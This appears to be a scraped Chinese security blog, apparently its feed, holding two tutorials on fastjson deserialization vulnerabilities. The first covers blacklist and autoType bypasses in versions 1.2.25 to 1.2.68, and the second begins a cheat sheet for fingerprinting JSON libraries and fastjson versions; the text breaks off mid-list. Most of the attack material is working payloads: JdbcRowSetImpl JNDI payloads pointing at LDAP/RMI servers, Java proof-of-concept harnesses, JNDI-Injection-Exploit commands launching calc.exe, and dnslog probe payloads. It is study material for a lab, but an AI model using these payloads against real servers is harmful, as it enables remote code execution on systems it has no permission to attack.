接下来我们定位到checkAutoType()方法，看一下它的逻辑：如果开启了autoType，那么就先判断类名在不在白名单中，如果在就用TypeUtils.loadClass加载，如果不在就去匹配黑名单：如果没开启autoType，则先匹配黑名单，然后再白名单匹配和加载；最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了autoType或者expectClass不为空也就是指定了Class对象时才会调用TypeUtils.loadClass加载，否则fastjson会默认禁止加载该类。我们跟进一下这里的loadClass方法：问题就出在这里：我们来仔细看下上图红框中的代码，代码的含义是：如果类名的字符串以[开头，则说明该类是一个数组类型，需要递归调用loadClass方法来加载数组元素类型对应的Class对象，然后使用Array.newIntrance方法来创建一个空数组对象，最后返回该数组对象的Class对象；如果类名的字符串以L开头并以;结尾，则说明该类是一个普通的Java类，需要把开头的L和结尾的;给去掉，然后递归调用loadClass。 （2）黑白名单绕过的复现基于以上的分析，我们可以发现，只要我们把payload简单改一下就可以绕过。我们需要先开启默认禁用的autoType，有以下三种方式： 123使用代码进行添加：ParserConfig.getGlobalInstance().addAccept(&quot;org.example.,org.javaweb.&quot;);或者ParserConfig.getGlobalInstance().setAutoTypeSupport(true);加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.example.在fastjson.properties中添加：fastjson.parser.autoTypeAccept=org.example. 我们先去[https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)下载个JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，然后启动利用工具： 1java -jar .\\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C &quot;calc.exe&quot; 选择下面的JDK 1.8的：然后在Main.py中写入如下代码： 12345678910111213141516171819202122package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;public class Main { public static void main(String[] args) { String payload = &quot;{\\n&quot; + &quot; \\&quot;a\\&quot;:{\\n&quot; + &quot; \\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\n&quot; + &quot; \\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;\\n&quot; + &quot; },\\n&quot; + &quot; \\&quot;b\\&quot;:{\\n&quot; + &quot; \\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\n&quot; + &quot; \\&quot;dataSourceName\\&quot;:\\&quot;ldap://127.0.0.1:1389/ppcjug\\&quot;,\\n&quot; + &quot; \\&quot;autoCommit\\&quot;:true\\n&quot; + &quot; }\\n&quot; + &quot;}&quot;; JSON.parse(payload); }} 以上为第一种poc，在JDK 8u181下使用ldap测试成功，使用rmi测试失败。除此之外，另一种poc则需要满足漏洞利用条件为JDK 6u113、7u97 和 8u77之前，例如我们这里重新新建一个项目，并从[https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html)处下载jdk-8u65-windows-x64.exe并安装。然后利用新安装的jdk 8u65来启动jndi exploit： 1&quot;C:\\Program Files\\Java\\jdk1.8.0_65\\bin\\java.exe&quot; -jar .\\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C &quot;calc.exe&quot; 导入fastjson1.2.25： 123456789101112131415161718192021222324&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;fastjson_8u66_1_2_25&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.25&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 在Main.java中写入如下内容： 12345678910111213package org.example;import com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.parser.ParserConfig;public class Main { public static void main(String[] args){ ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // ldap 和 rmi都可以 String payload = &quot;{\\&quot;@type\\&quot;:\\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;rmi://127.0.0.1:1099/ift2ty\\&quot;, \\&quot;autoCommit\\&quot;:true}&quot;; JSONObject.parse(payload); }} （3）对两种poc绕过手法的分析首先来说说限制，基于JNDI+RMI或JDNI+LADP进行攻击，会有一定的JDK版本限制。 12RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191 ①第一种poc（1.2.25-1.2.47通杀！！！）然后我们先来看第一种poc。我们仔细欣赏下第一种poc的payload： 1{&quot;a&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1/exp&quot;,&quot;autoCommit&quot;:true}} 我们会发现，加上{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}就会绕过原本的autoType，由此我们可以猜测，针对未开启autoType的情况，fastjson的源代码中应该是有相关方法去针对处理的，并且利用我们的这种方式，正好可以对应上。于是我们直接去查看源代码，翻到checkAutoType的地方，可以看到，如果没开启autoType，就会有以下两种加载方式：第一种是从mappings里面获取，也就是上图中的第727行代码，点进去之后可以看到：如果获取不到就采用第二种方法，也就是第728-730行代码，从deserializers中获取。deserializers是什么呢？可以看fastjson-1.2.25.jar!\\com\\alibaba\\fastjson\\parser\\ParserConfig.class的第172-241行，里面是内置的一些类和对应的反序列化器。但是deserializers是private类型的，我们搜索deserializers.put，发现当前类里面有一个public的putDeserializer方法，可以向deserializers中添加新数据：于是我们全局搜索该方法，发现就一个地方调用了，而且没办法寻找利用链：所以继续看第一种方法，从mappings获取的。可以看到，mappings这里也是private：搜索mappings.put，可以看到在TypeUtils.loadClass中有调用到：于是我们全局搜索，可以看到有如下五处调用：我们一个个看。第一个需要开启autoType：第二个要在白名单内，第三个要开启autoType：第四个是在MiscCodec.deserialze中的，貌似没什么限制，我们先放一边：第五个没办法利用，因为传不了参数，跳过：也就是说，只能从MiscCodec.deserialze这里来寻找突破口了。翻到MiscCodec.java的最上面可以看到，这个MiscCodec是继承了ObjectSerializer和ObjectDeserializer的：因此，可以判断，这个MiscCodec应该是个反序列化器，于是我们去之前的deserializers中看看都有谁用了：挺多的，结合MiscCodec中一堆的if语句，可以判断，一些简单的类都被放在这里了。我们再来看这行代码：然后跟进strVal，看看是哪儿来的：继续跟进这个objVal：到这里就很明显了，那红框中的这段代码是什么意思呢？首先，代码中的if语句判断当前解析器的状态是否为TypeNameRedirect，如果是，则进入if语句块中进行进一步的解析。在if语句块中，首先将解析器的状态设置为NONE，然后使用parser.accept(JSONToken.COMMA)方法接受一个逗号Token，以便后续的解析器对其进行处理。接下来，使用lexer.token()方法判断下一个Token的类型，如果是一个字符串，则进入if语句块中进行进一步的判断。在if语句块中，使用lexer.stringVal()方法获取当前Token的字符串值，并与val进行比较。如果不相等，则抛出一个JSON异常；如果相等，则使用lexer.nextToken()方法将lexer的指针指向下一个Token，然后使用parser.accept(JSONToken.COLON)方法接受一个冒号Token，以便后续的解析器对其进行处理。最后，使用parser.parse()方法解析当前Token，并将解析结果赋值给objVal。如果当前Token不是一个对象的结束符（右花括号），则使用parser.accept(JSONToken.RBRACE)方法接受一个右花括号Token，以便后续的解析器对其进行处理。如果当前解析器的状态不是TypeNameRedirect，则直接使用parser.parse()方法解析当前Token，并将解析结果赋值给objVal。根据之前分析的，objVal会传给strVal，然后TypeUtils.loadClass在执行的过程中，会把strVal放到mappings缓存中。加载到缓存中以后，在下一次checkAutoType的时候，直接就返回了，绕过了检验的部分直接执行： ②第二种poc第二种poc的绕过手法在上面的“黑白名单机制介绍”中已经写的很清楚了，直接参考即可。需要注意的是，由于代码是循环去掉L和;的，所以我们不一定只在头尾各加一个L和;。由于1.2.25的代码中有如下代码：因此我们可以构造如下poc： 12345678910111213package org.example;import com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.parser.ParserConfig;public class Main { public static void main(String[] args){ ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // ldap 和 rmi都可以 String payload = &quot;{\\&quot;a\\&quot;:{\\&quot;@type\\&quot;:\\&quot;[com.sun.rowset.JdbcRowSetImpl\\&quot;[{, \\&quot;dataSourceName\\&quot;:\\&quot;ldap://127.0.0.1:1389/ift2ty\\&quot;, \\&quot;autoCommit\\&quot;:true}}&quot;; JSONObject.parse(payload); }} 也可以绕过： （4）关于JdbcRowSetImpl链利用的分析从上面我们学习了绕过黑白名单的学习，接下来看JdbcRowSetImpl利用链的原理。根据FastJson反序列化漏洞原理，FastJson将JSON字符串反序列化到指定的Java类时，会调用目标类的getter、setter等方法。JdbcRowSetImpl类的setAutoCommit()会调用connect()方法，connect()函数如下：我们把这段代码单独拿出来分析： 123456789101112131415private Connection connect() throws SQLException { if (this.conn != null) { return this.conn; } else if (this.getDataSourceName() != null) { try { InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection(); } catch (NamingException var3) { throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString()); } } else { return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null; }} 一眼就看到了两行异常熟悉的代码： 12InitialContext var1 = new InitialContext();DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); 我们可以通过一个简单的小demo快速了解： 12345678910package org.example;import com.sun.rowset.JdbcRowSetImpl;public class Main { public static void main(String[] args) throws Exception { JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl(); JdbcRowSetImpl_inc.setDataSourceName(&quot;rmi://127.0.0.1:1099/ift2ty&quot;); JdbcRowSetImpl_inc.setAutoCommit(true); }} 所以之前的两种poc可以直接自定义uri利用成功。 3. fastjson 1.2.42 反序列化漏洞首先先下载fastjson 1.2.25： 12345678910111213141516171819202122232425&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;fastjson_1_2_42&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.42&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 直接翻到ParseConfig这里：可以看到，fastjson把原来的明文黑名单转换为Hash黑名单，但是并没什么用，目前已经被爆出来了大部分，具体可以参考： https://github.com/LeadroyaL/fastjson-blacklist 然后checkAutoType这里进行判断，仅仅是把原来的L和;换成了hash的形式：所以直接双写L和;即可： 12345678910111213package org.example;import com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.parser.ParserConfig;public class Main { public static void main(String[] args){ ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // ldap 和 rmi都可以 String payload = &quot;{\\&quot;@type\\&quot;:\\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;rmi://127.0.0.1:1099/ift2ty\\&quot;, \\&quot;autoCommit\\&quot;:true}&quot;; JSONObject.parse(payload); }} 4. fastjson 1.2.43 反序列化漏洞修改之前的pom.xml里面的版本为1.2.43。直接全局搜索checkAutoType，看修改后的代码：意思就是说如果出现连续的两个L，就报错。那么问题来了，你也妹对[进行限制啊，直接绕： 12345678910111213package org.example;import com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.parser.ParserConfig;public class Main { public static void main(String[] args){ ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // ldap 和 rmi都可以 String payload = &quot;{\\&quot;@type\\&quot;:\\&quot;[com.sun.rowset.JdbcRowSetImpl\\&quot;[{,\\&quot;dataSourceName\\&quot;:\\&quot;rmi://127.0.0.1:1099/ift2ty\\&quot;, \\&quot;autoCommit\\&quot;:true}&quot;; JSONObject.parse(payload); }} 5. fastjson 1.2.44 mappings缓存导致反序列化漏洞修改之前的pom.xml里面的版本为1.2.44。这个版本的fastjson总算是修复了之前的关于字符串处理绕过黑名单的问题，但是存在之前完美在说fastjson 1.2.25版本的第一种poc的那个通过mappings缓存绕过checkAutoType的漏洞，复现如下： 12345678910111213package org.example;import com.alibaba.fastjson.JSONObject;import com.alibaba.fastjson.parser.ParserConfig;public class Main { public static void main(String[] args){ ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // ldap 和 rmi都可以 String payload = &quot;{\\&quot;a\\&quot;:{\\&quot;@type\\&quot;:\\&quot;java.lang.Class\\&quot;,\\&quot;val\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;},\\&quot;b\\&quot;:{\\&quot;@type\\&quot;:\\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;rmi://127.0.0.1:1099/ift2ty\\&quot;,\\&quot;autoCommit\\&quot;:true}}&quot;; JSONObject.parse(payload); }} 6. fastjson 1.2.47 mappings缓存导致反序列化漏洞原理同上，payload也同上。复现截图： 7.fastjson 1.2.68 反序列化漏洞fastjson 1.2.47的时候爆出来的这个缓存的漏洞很严重，官方在1.2.48的时候就进行了限制。我们修改上面的pom.xml中fastjson版本为1.2.68。直接翻到MiscCodec这里，可以发现，cache这里默认设置成了false：并且loadClass重载方法的默认的调用改为不缓存：fastjson 1.2.68的一个亮点就是更新了个safeMode：如果开启了safeMode，那么autoType就会被完全禁止。但是，这个版本有了个新的绕过方式：expectClass。仔细看checkAutoType函数： 以下条件的整理参考：https://blog.csdn.net/mole_exp/article/details/122315526 发现同时满足以下条件的时候，可以绕过checkAutoType： expectClass不为null，且不等于Object.class、Serializable.class、Cloneable.class、Closeable.class、EventListener.class、Iterable.class、Collection.class； expectClass需要在缓存集合TypeUtils#mappings中； expectClass和typeName都不在黑名单中； typeName不是ClassLoader、DataSource、RowSet的子类； typeName是expectClass的子类。 这个expectClass并不是什么陌生的新名词，我们在前置知识里面的demo中的这个Person.class就是期望类： 1Person person2 = JSON.parseObject(jsonString2, Person.class); 但是之前的那些payload执行的时候，期望类这里都是null，那么是哪些地方调用了呢？我们直接全局搜索parser.getConfig().checkAutoType：一个是JavaBeanDeserializer的deserialze这里：另一个是ThrowableDeserializer的deserialze这里：具体的分析可以看tr1ple师傅的文章，写的实在是太详细了： https://www.cnblogs.com/tr1ple/p/13489260.html 四、参考与致谢我在学习fastjson漏洞的时候，阅读参考了以下文章，每篇文章都或多或少地给予了我帮助与启发，于是在此一并列出！也十分感谢4ra1n师傅和su18师傅热情地回答我一个Java初学者提出的可能有点傻的问题。（笑） 123456789101112131415161718192021222324252627282930313233343536373839404142434445https://www.anquanke.com/post/id/248892https://paper.seebug.org/1698/https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/https://www.rc.sb/fastjson/https://drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl利用链/https://blog.weik1.top/2021/09/08/Fastjson 反序列化历史漏洞分析/http://blog.topsec.com.cn/fastjson-1-2-24反序列化漏洞深度分析/https://xz.aliyun.com/t/7107https://www.javasec.org/java-vuls/FastJson.htmlhttps://www.freebuf.com/articles/web/265904.htmlhttps://b1ue.cn/archives/506.htmlhttp://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/https://forum.butian.net/share/1092https://www.freebuf.com/vuls/178012.htmlhttps://www.cnblogs.com/nice0e3/p/14776043.htmlhttps://www.cnblogs.com/nice0e3/p/14601670.htmlhttp://140.143.242.46/blog/024.htmlhttps://paper.seebug.org/994/https://paper.seebug.org/1192/http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/https://zhuanlan.zhihu.com/p/544463507https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/https://www.anquanke.com/post/id/240446https://yaklang.io/products/article/yakit-technical-study/fast-Json/https://su18.org/post/fastjson/#2-fastjson-1225https://cloud.tencent.com/developer/article/1957185https://yaklang.io/products/article/yakit-technical-study/fast-Jsonhttps://developer.aliyun.com/article/842073http://wjlshare.com/archives/1526https://xz.aliyun.com/t/9052#toc-16https://blog.csdn.net/Adminxe/article/details/105918000https://blog.csdn.net/q20010619/article/details/123155767https://xz.aliyun.com/t/7027#toc-3https://xz.aliyun.com/t/7027#toc-5https://www.sec-in.com/article/950https://xz.aliyun.com/t/7027#toc-14https://www.cnblogs.com/nice0e3/p/14776043.html#1225-1241-绕过https://www.cnblogs.com/nice0e3/p/14776043.html#1225版本修复https://y4er.com/posts/fastjson-1.2.80/#回顾fastjson历史漏洞https://github.com/su18/hack-fastjson-1.2.80https://blog.csdn.net/mole_exp/article/details/122315526https://www.cnblogs.com/ph4nt0mer/p/13065373.htmlhttps://alewong.github.io/2020/09/14/Fastjson-1-2-68版本反序列化漏洞分析篇/https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.htmlhttps://www.anquanke.com/post/id/225439","link":"/2024/12/30/LearnFastjsonVulnFromZero-Basic/"},{"title":"零基础学fastjson漏洞（提高篇）","text":"零、写在前面的话0.1 前言在我刚接触Java安全的时候，我写过一篇零基础入门级别的文章： 【两万字原创长文】完全零基础入门Fastjson系列漏洞（基础篇）https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw 现在距离这篇文章的写作时间已经过去整整半年，该写写他的提高篇了。基础篇发布后，很多师傅在朋友圈发表了留言，有不少师傅提出了宝贵而真挚的建议，也有师傅（@Y1ngSec、@lenihaoa）指出我文章的不足，我在此再次表示诚挚的感谢。后来我在准备写fastjson漏洞利用提高篇的时候发现，网上的一些payload总结要么是东一块西一块很零散，要么就是没有经过仔细的校对（一些payload的注释的利用范围明显是错的，另一些给出的payload本身就是错的），要么就是说明很简短，让新手看了一头雾水不知道具体出现什么情况才是正确的。为了方便自己平时查阅利用，也为了尽量修复以上的问题，我写下了这篇文章。不过需要注意的是，这篇文章是总结性质的，是从1到n的，并非从0到1，所有我参考过的文章我都会列在文章末尾以表示感谢。 0.2 准备工作我这里大部分直接使用safe6Sec师傅制作的复现环境（如果需要使用其他的靶场我会单独说明）： 1git clone https://github.com/safe6Sec/ShiroAndFastJson.git 我修改了IndexController.java文件中的parse函数，方便我查看解析结果或者解析报错内容： 12345678910111213@PostMapping(&quot;/json&quot;)@ResponseBodypublic JSONObject parse(@RequestBody String data) { JSONObject jsonObject = new JSONObject(); try { jsonObject.put(&quot;status&quot;, 0); jsonObject.put(&quot;message&quot;, String.valueOf(JSON.parse(data))); } catch (Exception e) { jsonObject.put(&quot;status&quot;, -1); jsonObject.put(&quot;error&quot;, e.getMessage()); } return jsonObject;} 接下来，如果不做特别说明的话，我都是向json接口进行post请求payload。 一、判断所使用的Json库需要注意的是，以下大部分都是在没有报错返回的情况下利用的方法，个别的我会做出说明。 1.1 Fastjson1.1.1 dnslog判断法payload1： 1{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;rtpmognpiy.dgrh3.cn&quot;}} payload2： 1{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://qvhkmkgcta.dgrh3.cn&quot;}:&quot;a&quot;} 如果以上payload正常返回并受到dnslog请求，说明目标使用的是fastjson框架。 1.1.2 解析判断法payload3： 1{&quot;ext&quot;:&quot;blue&quot;,&quot;name&quot;:{&quot;$ref&quot;:&quot;$.ext&quot;}} 如果解析成功，那么说明目标使用的是fastjson：至于这个下面的这个payload4，需要根据具体环境参数来修改，不可直接使用： 1{&quot;a&quot;:new a(1),&quot;b&quot;:x'11',/*\\*\\/&quot;c&quot;:Set[{}{}],&quot;d&quot;:&quot;\\u0000\\x00&quot;} 本意就是如果能对上面的参数的值自动解析，说明使用了fastjson组件：payload5： 1{&quot;@type&quot;: &quot;whatever&quot;} 如果对方的代码写的是像我这样显示报错内容的话，可以通过这个来判断（出现autoType is not support. whatever说明使用了fastjson），但是一般不会，所以实战中基本上用不到： 1.2 jackson1.2.1 浮点类型精度丢失判断法如果对方传入的参数中存在一个double类型的（比如说年龄），我们就可以利用这个方法来判断。正常传参： 1{&quot;score&quot;: 1} payload6： 1{&quot;score&quot;: 1.1111111111111111111111111111111111111111111111111111111111111} 如果返回结果是类似1.1111111111111112这种，那么就说明使用的可能是jackson（fastjson如果不加Feature.UseBigDecimal这个参数，也会丢失精度；gson也是会丢失精度的；因此可以继续利用前面的payload来进一步区分fastjson、jackson和gson）： 1.2.2 注释符判断法payload7： 1{&quot;age&quot;: 1}/*#W01fh4cker 如果不报错，说明使用的是jackson： 1.2.3 单引号判断法正常传参： 1{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;} payload8： 1{&quot;username&quot;: 'admin', &quot;password&quot;: 'admin'} 如果改成单引号，报错如上，那么就是jackson。fastjson是不报错的： 1.2.4 多余类成员判断法正常传参： 1{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;} payload9： 1{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin&quot;, &quot;test&quot;: 1} 如果报错如下，则说明是jackson：fastjson是不会报错的，这里我们请求doLogin路由来验证： 12345678POST /doLogin?username=admin&amp;password=admin&amp;test=1&amp;rememberme=remember-me HTTP/1.1Host: 10.0.47.4:8888Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=8D9951E527FEE008DB7B874D70636D86Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 1.3 gson1.3.1 浮点类型精度丢失判断法在1.2.1中我们已经讨论过了，在此不做赘述。 1.3.2 注释符判断法payload10： 1#\\r\\n{&quot;score&quot;:1.1} 正常说明为gson。 1.4 org.jsonpayload11： 1{&quot;username&quot;: '\\r', &quot;password&quot;: &quot;admin&quot;} 出现如上报错，说明使用的是org.json，这个就需要能看到报错的内容了。 1.5 hutool.jsonpayload12： 1{a:whatever}/*\\r\\nxxx 如果返回正确（最好是能看到返回的值为{&quot;a&quot;:&quot;whatever&quot;}），说明使用的是hutool.json： 二、判断fastjson版本2.1 有报错信息返回的情况开发人员如果对异常信息处理不当，就给了我们有机可乘的机会，以下是一些常用的在有报错信息返回的情况下的判断fastjson版本的方法。payload13： 1{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot; payload14： 1[&quot;test&quot;:1] 这里我们使用浅蓝师傅的靶场： https://github.com/iSafeBlue/fastjson-autotype-bypass-demo 需要说明的是，该payload只适用于至于[&quot;test&quot;:1]这个payload，我在该靶场没有测试成功；我后来自己写了个demo，测试成功，大家也可以自行测试：对于payload13的报错情况，我们还可以细分。如果代码在写的时候几乎没有做任何异常处理（这种情况挺少见的），那么我们根据报错的代码出错点很快就可以判断出对方使用的是parseObject还是parse来处理数据的；否则我们只能根据有限的返回的报错信息来判断： 2.1.1 JSON.parseObject(jsondata, User.class)2.1.1.1 判断1.1.15&lt;=version&lt;=1.1.26报错： 1syntax error, expect {, actual EOF 2.1.1.2 判断1.1.27&lt;=version&lt;=1.2.11报错会显示错误的行数： 1syntax error, expect {, actual EOF, pos 9 2.1.1.3 判断1.2.12&lt;=version&lt;=1.2.24报错： 1type not match 2.1.1.4 判断1.2.25&lt;=version&lt;=2.0.1报错（后面接具体的类）： 1type not match. java.lang.AutoCloseable -&gt; org.example.Main$User 其中，fastjson2以后，都会多一处报错，后面的情况也是一样的： 1Caused by: com.alibaba.fastjson2.JSONException... 2.1.1.5 判断2.0.1&lt;=version&lt;=2.0.5.graal以及2.0.9&lt;=version&lt;=2.0.12报错类似如下： 1error, offset 35, char 2.1.1.6 判断2.0.6&lt;=version&lt;=2.0.7报错： 1illegal character 2.1.1.7 判断2.0.8以及2.0.13&lt;=version&lt;=2.0.40（我写这篇文章的时候的最新版本）报错内容中会直接显示当前版本的版本号，很方便： 1illegal character , offset 35, character , line 1, column 35, fastjson-version 2.0.8 {&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot; 2.1.2 JSON.parse(jsonData);2.1.2.1 判断1.1.15&lt;=version&lt;=1.1.26报错： 1syntax error, expect {, actual EOF 2.1.2.2 判断1.1.27&lt;=version&lt;=1.2.32报错类似如下： 1syntax error, expect {, actual EOF, pos 0 2.1.2.3 判断1.2.33&lt;=version&lt;=2.0.40报错中都会直接显示版本号：fastjson1中显示如下： 1syntax error, expect {, actual EOF, pos 0, fastjson-version 1.2.83 fastjson2中显示如下： 1Illegal syntax: , offset 34, character , line 1, column 35, fastjson-version 2.0.40 {&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot; 但是需要注意的是1.2.76&lt;=version&lt;=1.2.80的时候，显示的版本都是1.2.76，原因是作者写死在代码里了，我提了个issue（https://github.com/alibaba/fastjson/issues/4451）： 2.2 dnslog判断法特别说明：dns能出网并不代表存在fastjson漏洞！！！另外，讨论1.2.24以前的版本没什么意义，因此基本不会在下文中涉及。 2.2.1 判断1.1.15&lt;=version&lt;=1.2.24正常传参： 1{&quot;name&quot;:&quot;admin&quot;,&quot;email&quot;:&quot;admin&quot;,&quot;content&quot;:&quot;admin&quot;} payload15： 1{&quot;name&quot;:&quot;admin&quot;,&quot;email&quot;:&quot;admin&quot;,&quot;content&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://aclarecpsj.dgrh3.cn/POC&quot;,&quot;autoCommit&quot;:true}} 2.2.2 判断1.2.37&lt;=version&lt;=1.2.83payload16： 1{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://rpdmvyfajp.dgrh3.cn&quot;}:&quot;aaa&quot;} 2.2.3 判断1.2.9&lt;=version&lt;=1.2.47payload17： 1{&quot;username&quot;:{&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;bjmgclhjrs.dgrh3.cn&quot;}, &quot;password&quot;:&quot;admin&quot;} 需要注意，有时候会报错如下，但是dnslog仍然会收到请求，这个是目标服务器的问题，多试就可以了： 1deserialize inet adress error 2.2.4 判断1.2.10&lt;=version&lt;=1.2.47payload18： 1[{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;java.io.ByteArrayOutputStream&quot;},{&quot;@type&quot;:&quot;java.io.ByteArrayOutputStream&quot;},{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;6m2csu.dnslog.cn&quot;}}] 除非对方有以下代码，否则1.2.47以后的版本都会报错： 12ParserConfig.getGlobalInstance().addAccept(&quot;java.lang.Class&quot;);ParserConfig.getGlobalInstance().addAccept(&quot;java.io.ByteArrayOutputStream&quot;); 2.2.5 判断1.2.9&lt;=version&lt;=1.2.36payload19： 1{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://tbqnrzguzp.dgrh3.cn&quot;}}&quot;&quot;} 如果不报错、dnslog无响应，说明版本处于1.2.9至1.2.36。 2.2.6 判断1.2.37&lt;=version&lt;=1.2.83还是上面的payload19，如果dnslog有响应，说明处于1.2.37和1.2.83之间。 2.2.7 判断1.2.9&lt;=version&lt;=1.2.83payload20： 1Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://wobfyhueao.dgrh3.cn&quot;}] 2.2.8 判断version≠(1.2.24 || 1.2.83)payload21： 